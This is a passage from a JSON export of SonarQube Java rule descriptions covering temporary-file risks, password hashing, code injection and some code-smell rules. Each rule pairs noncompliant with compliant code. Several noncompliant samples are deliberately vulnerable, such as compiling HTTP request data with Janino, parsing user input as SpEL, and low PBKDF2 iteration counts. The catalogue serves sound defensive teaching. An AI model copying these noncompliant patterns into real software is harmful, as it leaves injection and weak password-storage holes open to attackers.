<li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222567\">Application Security and\n  Development: V-222567</a> - The application must not be vulnerable to race conditions. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5445","summary":"Insecure temporary file creation methods should not be used","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples below). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nnew File(\"/tmp/myfile.txt\"); // Sensitive\nPaths.get(\"/tmp/myfile.txt\"); // Sensitive\n\njava.io.File.createTempFile(\"prefix\", \"suffix\"); // Sensitive, will be in the default temporary-file directory.\njava.nio.file.Files.createTempDirectory(\"prefix\"); // Sensitive, will be in the default temporary-file directory.\n</pre>\n<pre>\nMap&lt;String, String&gt; env = System.getenv();\nenv.get(\"TMP\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nnew File(\"/myDirectory/myfile.txt\");  // Compliant\n\nFile.createTempFile(\"prefix\", \"suffix\", new File(\"/mySecureDirectory\"));  // Compliant\n\nif(SystemUtils.IS_OS_UNIX) {\n  FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; attr = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(\"rwx------\"));\n  Files.createTempFile(\"prefix\", \"suffix\", attr); // Compliant\n}\nelse {\n  File f = Files.createTempFile(\"prefix\", \"suffix\").toFile();  // Compliant\n  f.setReadable(true, true);\n  f.setWritable(true, true);\n  f.setExecutable(true, true);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222567\">Application Security and\n  Development: V-222567</a> - The application must not be vulnerable to race conditions. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5443","summary":"Using publicly writable directories is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When <code>List.remove()</code> is called, the list shrinks, and the indices of all elements following the removed element are decremented by one.\nIf this operation is performed within a loop that iterates through the elements in ascending order, it will cause the loop to skip the element\nimmediately following the removed element.</p>\n<h2>How to fix it</h2>\n<p>There are three ways how to fix this issue:</p>\n<ol>\n  <li> Replace the loop with a call to <code>Collection.removeIf()</code>. This is the preferred solution. </li>\n  <li> Replace the ascending loop with a descending loop. Use this approach if the preferred solution is not possible due to side effects of the loop.\n  </li>\n  <li> Adjust the loop counter within the loop body after the call to <code>Collection.remove()</code>. <strong>This approach is not\n  recommended</strong>, because it will raise an issue with rule <em>{rule:java:S127} - \"for\" loop stop conditions should be invariant</em> </li>\n</ol>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>If the loop can be replaced with Java 8âs <code>Collection.removeIf</code> method, depending on the side effects of the loop and your Java target\nversion, then this is the preferred solution for this issue.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid removeFrom(List&lt;String&gt; list) {\n  // expected: iterate over all list elements\n  for (int i = 0; i &lt; list.size(); i++) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i); // Noncompliant, next element is skipped\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid removeFrom(List&lt;String&gt; list) {\n  list.removeIf(String::isEmpty); // Compliant\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If this is not possible due to side effects of the loop, replace the ascending loop with a descending loop. Descending loops are not affected by\ndecrementing the element indices after the removed element, because they have already been iterated.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nvoid removeFrom(List&lt;String&gt; list) {\n  // expected: iterate over all list elements\n  for (int i = 0; i &lt; list.size(); i++) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i); // Noncompliant, next element is skipped\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nvoid removeFrom(List&lt;String&gt; list) {\n    // expected: iterate over all list elements\n    for (int i = list.size() - 1; i &gt;= 0; i--) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i); // Compliant, elements after removed one have already been iterated\n    }\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>Another way to solve this issue is to adjust the loop counter after the call to <code>Collection.remove</code> to account for the index\ndecrement.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nvoid removeFrom(List&lt;String&gt; list) {\n  // expected: iterate over all list elements\n  for (int i = 0; i &lt; list.size(); i++) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i); // Noncompliant, next element is skipped\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p><strong>This is not recommanded</strong> because it raises an issue with rule {rule:java:S127}.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nvoid removeFrom(List&lt;String&gt; list) {\n  // expected: iterate over all list elements\n  for (int i = 0; i &lt; list.size(); i++) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i); // Compliant due to counter adjust in next line\n      i--; // Noncompliant with S127!\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/Collection.html#remove(java.lang.Object)\">Java SE 7 API Specification:\n  Collection.remove</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Collection.html#removeIf-java.util.function.Predicate-\">Java SE 8 API\n  Specification: Collection.removeIf</a> </li>\n  <li> <a href=\"https://sonarsource.github.io/rspec/#/rspec/{rule:java:S6068}/java\">{rule:java:S127} - \"for\" loop stop conditions should be\n  invariant</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5413","summary":"'List.remove()' should not be used in ascending 'for' loops","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When boxed type <code>java.lang.Boolean</code> is used as an expression to determine the control flow (as described in <a\nhref=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-4.html#jls-4.2.5\">Java Language Specification Â§4.2.5 The <code>boolean</code> Type and\nboolean Values</a>) it will throw a <code>NullPointerException</code> if the value is <code>null</code> (as defined in <a\nhref=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8\">Java Language Specification Â§5.1.8 Unboxing Conversion</a>).</p>\n<p>It is safer to avoid such conversion altogether and handle the <code>null</code> value explicitly.</p>\n<p>Note, however, that no issues will be raised for Booleans that have already been null-checked or are marked <code>@NonNull/@NotNull</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nBoolean b = getBoolean();\nif (b) {  // Noncompliant, it will throw NPE when b == null\n  foo();\n} else {\n  bar();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nBoolean b = getBoolean();\nif (Boolean.TRUE.equals(b)) {\n  foo();\n} else {\n  bar();  // will be invoked for both b == false and b == null\n}\n\n\nBoolean b = getBoolean();\nif(b != null){\n  String test = b ? \"test\" : \"\";\n}\n</pre>\n<h3>Exceptions</h3>\n<p>The issue is not raised if the expression is annotated <code>@NonNull</code> / <code>@NotNull</code>. This is useful if a boxed type is an\ninstantiation of a generic type parameter and cannot be avoided.</p>\n<pre>\nList&lt;Boolean&gt; list = new ArrayList&lt;&gt;();\nlist.add(true);\nlist.add(false);\nlist.forEach((@NonNull Boolean value) -&gt; {\n  // Compliant\n  if(value) {\n    System.out.println(\"yes\");\n  }\n});\n\n@NonNull Boolean someMethod() { /* ... */ }\n\n// Compliant\nif(someMethod()) { /* ... */ }\n\n@NonNull Boolean boxedNonNull = Boolean.TRUE;\n\n// Compliant\nif(boxedNonNull) { /* ... */ }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8\">Java Language Specification Â§5.1.8 Unboxing Conversion</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-5411","summary":"Avoid using boxed \"Boolean\" types directly in boolean expressions","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The underlying implementation of <code>String::replaceAll</code> calls the <code>java.util.regex.Pattern.compile()</code> method each time it is\ncalled even if the first argument is not a regular expression. This has a significant performance cost and therefore should be used with care.</p>\n<p>When <code>String::replaceAll</code> is used, the first argument should be a real regular expression. If itâs not the case,\n<code>String::replace</code> does exactly the same thing as <code>String::replaceAll</code> without the performance drawback of the regex.</p>\n<p>This rule raises an issue for each <code>String::replaceAll</code> used with a <code>String</code> as first parameter which doesnât contains\nspecial regex character or pattern.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString init = \"Bob is a Bird... Bob is a Plane... Bob is Superman!\";\nString changed = init.replaceAll(\"Bob is\", \"It's\"); // Noncompliant\nchanged = changed.replaceAll(\"\\\\.\\\\.\\\\.\", \";\"); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString init = \"Bob is a Bird... Bob is a Plane... Bob is Superman!\";\nString changed = init.replace(\"Bob is\", \"It's\");\nchanged = changed.replace(\"...\", \";\");\n</pre>\n<p>Or, with a regex:</p>\n<pre>\nString init = \"Bob is a Bird... Bob is a Plane... Bob is Superman!\";\nString changed = init.replaceAll(\"\\\\w*\\\\sis\", \"It's\");\nchanged = changed.replaceAll(\"\\\\.{3}\", \";\");\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> {rule:java:S4248} - Regex patterns should not be created needlessly </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5361","summary":"\"String#replace\" should be preferred to \"String#replaceAll\"","tags":["regex","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>The improper storage of passwords poses a significant security risk to software applications. This vulnerability arises when passwords are stored\nin plaintext or with a fast hashing algorithm. To exploit this vulnerability, an attacker typically requires access to the stored passwords.</p>\n<h2>Why is this an issue?</h2>\n<p>Attackers who would get access to the stored passwords could reuse them without further attacks or with little additional effort.<br> Obtaining the\nplaintext passwords, they could then gain unauthorized access to user accounts, potentially leading to various malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>Plaintext or weakly hashed password storage poses a significant security risk to software applications.</p>\n<h4>Unauthorized Access</h4>\n<p>When passwords are stored in plaintext or with weak hashing algorithms, an attacker who gains access to the password database can easily retrieve\nand use the passwords to gain unauthorized access to user accounts. This can lead to various malicious activities, such as unauthorized data access,\nidentity theft, or even financial fraud.</p>\n<h4>Credential Reuse</h4>\n<p>Many users tend to reuse passwords across multiple platforms. If an attacker obtains plaintext or weakly hashed passwords, they can potentially use\nthese credentials to gain unauthorized access to other accounts held by the same user. This can have far-reaching consequences, as sensitive personal\ninformation or critical systems may be compromised.</p>\n<h4>Regulatory Compliance</h4>\n<p>Many industries and jurisdictions have specific regulations and standards to protect user data and ensure its confidentiality. Storing passwords in\nplaintext or with weak hashing algorithms can lead to non-compliance with these regulations, potentially resulting in legal consequences, financial\npenalties, and damage to the reputation of the software application and its developers.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The derived key is vulnerable because the cost factor (rounds) is too low for the chosen algorithm.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nprivate SecretKey deriveKey(String password, byte[] salt) throws Exception {\n    PBEKeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 120000, 256); // Noncompliant\n    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"PBKDF2withHmacSHA512\");\n    return secretKeyFactory.generateSecret(keySpec);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nprivate SecretKey deriveKey(String password, byte[] salt) throws Exception {\n    PBEKeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 210000, 256);\n    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"PBKDF2withHmacSHA512\");\n    return secretKeyFactory.generateSecret(keySpec);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Select the correct PBKDF2 parameters</h4>\n<p>If PBKDF2 must be used, be aware that default values might not be considered secure.<br> Depending on the algorithm used, the number of iterations\nshould be adjusted to ensure that the derived key is secure. The following are the recommended number of iterations for PBKDF2:</p>\n<ul>\n  <li> PBKDF2-HMAC-SHA1: 1,300,000 iterations </li>\n  <li> PBKDF2-HMAC-SHA256: 600,000 iterations </li>\n  <li> PBKDF2-HMAC-SHA512: 210,000 iterations </li>\n</ul>\n<p>Note that PBKDF2-HMAC-SHA256 is recommended by NIST.<br> Iterations are also called \"rounds\" depending on the library used.</p>\n<p>When recommended cost factors are too high in the context of the application or if the performance cost is unacceptable, a cost factor reduction\nmight be considered. In that case, it should not be chosen under 100,000.</p>\n<h3>Going the extra mile</h3>\n<h4>Pepper</h4>\n<p>In a defense-in-depth security approach, <strong>peppering</strong> can also be used. This is a security technique where an external secret value\nis added to a password before it is hashed.<br> This makes it more difficult for an attacker to crack the hashed passwords, as they would need to know\nthe secret value to generate the correct hash.<br> <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#peppering\">Learn more here</a>.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code is vulnerable because it uses a legacy digest-based password encoding that is not considered secure.</p>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\n@Autowired\npublic void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {\n  auth.jdbcAuthentication()\n    .dataSource(dataSource)\n    .usersByUsernameQuery(\"SELECT * FROM users WHERE username = ?\")\n    .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\n@Autowired\npublic void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {\n  auth.jdbcAuthentication()\n    .dataSource(dataSource)\n    .usersByUsernameQuery(\"SELECT * FROM users WHERE username = ?\")\n    .passwordEncoder(new BCryptPasswordEncoder());\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use secure password hashing algorithms</h4>\n<p>In general, you should rely on an algorithm that has no known security vulnerabilities. The MD5 and SHA-1 algorithms should not be used.</p>\n<p>Some algorithms, such as the SHA family functions, are considered strong for some use cases, but are too fast in computation and therefore\nvulnerable to brute force attacks, especially with bruteforce-attack-oriented hardware.</p>\n<p>To protect passwords, it is therefore important to choose modern, slow password-hashing algorithms. The following algorithms are, in order of\nstrength, the most secure password hashing algorithms to date:</p>\n<ol>\n  <li> Argon2 </li>\n  <li> scrypt </li>\n  <li> bcrypt </li>\n  <li> PBKDF2 </li>\n</ol>\n<p>Argon2 should be the best choice, and others should be used when the previous one is not available. For systems that must use FIPS-140-certified\nalgorithms, PBKDF2 should be used.</p>\n<p>Whenever possible, choose the strongest algorithm available. If the algorithm currently used by your system should be upgraded, OWASP documents\npossible upgrade methods here: <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#upgrading-legacy-hashes\">Upgrading Legacy Hashes</a>.</p>\n<p>In the previous example, the <code>BCryptPasswordEncoder</code> is a password hashing function in Java that is designed to be secure and resistant\nto various types of attacks, including brute-force and rainbow table attacks. It is slow, adaptative, and automatically implements a salt.</p>\n<h4>Never store passwords in plaintext</h4>\n<p>A user password should never be stored in plaintext. Instead, a hash should be produced from it using a secure algorithm. When dealing with\npassword storage security, best practices recommend relying on a slow hashing algorithm, that will make brute force attacks more difficult. Using a\nhashing function with adaptable computation and memory complexity also is recommended to be able to increase the security level with time.</p>\n<p>Adding a salt to the digest computation is also recommended to prevent pre-computed table attacks (see rule {rule:java:S2053}).</p>\n<h3>Pitfalls</h3>\n<h4>Pre-hashing passwords</h4>\n<p>As bcrypt has a maximum length input length of 72 bytes for most implementations, some developers may be tempted to pre-hash the password with a\nstronger algorithm before hashing it with bcrypt.</p>\n<p>Pre-hashing passwords with bcrypt is not recommended as it can lead to a specific range of issues. Using a strong salt and a high number of rounds\nis enough to protect the password.</p>\n<p>More information about this can be found here: <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords-with-bcrypt\">Pre-hashing Passwords with\nBcrypt</a>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Framework Security Documentation - <a\n  href=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/crypto/bcrypt/BCryptPasswordEncoder.html\">Class\n  BCryptPasswordEncoder</a> </li>\n  <li> OWASP CheatSheet - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\">Password Storage Cheat Sheet</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/256\">CWE-256 - Plaintext Storage of a Password</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/916\">CWE-916 - Use of Password Hash With Insufficient Computational Effort</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222542\">Application Security and\n  Development: V-222542</a> - The application must only store cryptographic representations of passwords. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-5344","summary":"Passwords should not be stored in plaintext or with a fast hashing algorithm","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organizationâs activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal serverâs data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Commons Compiler</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.codehaus.janino.ScriptEvaluator;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message) throws IOException, InvocationTargetException {\n        ScriptEvaluator se = new ScriptEvaluator();\n        se.cook(\"System.out.println(\" + message +\");\"); // Noncompliant\n        se.evaluate(null);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.codehaus.janino.ScriptEvaluator;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message) throws IOException, InvocationTargetException {\n        ScriptEvaluator se = new ScriptEvaluator();\n        se.setParameters(new String[] { \"input\" }, new Class[] { String.class });\n        se.cook(\"System.out.println(input);\");\n        se.evaluate(new Object[] { message });\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a languageâs native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<p>The compliant code example uses such an approach.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<h2>How to fix it in JSP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\n&lt;%@ taglib prefix=\"spring\" uri=\"http://www.springframework.org/tags\" %&gt;\n&lt;spring:eval expression=\"${tainted}\" var=\"result\"/&gt;\n</pre>\n<h4>Compliant solution</h4>\n<p>It is not possible to securely include user input in a SpEL expression inside of the template. Evaluate the expression in the controller and pass\nthe result to the template instead.</p>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\nimport org.springframework.ui.Model;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message, Model model) {\n        StandardEvaluationContext evaluationContext = new StandardEvaluationContext();\n        evaluationContext.setVariable(\"msg\", message);\n\n        ExpressionParser parser = new SpelExpressionParser();\n        Expression exp = parser.parseExpression(\"#msg\");\n        String result = (String) exp.getValue(evaluationContext);\n        model.addAttribute(\"result\", result);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a languageâs native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<p>The compliant code example uses such an approach.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message) {\n        ExpressionParser parser = new SpelExpressionParser();\n        Expression exp = parser.parseExpression(message);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport org.springframework.expression.Expression;\nimport 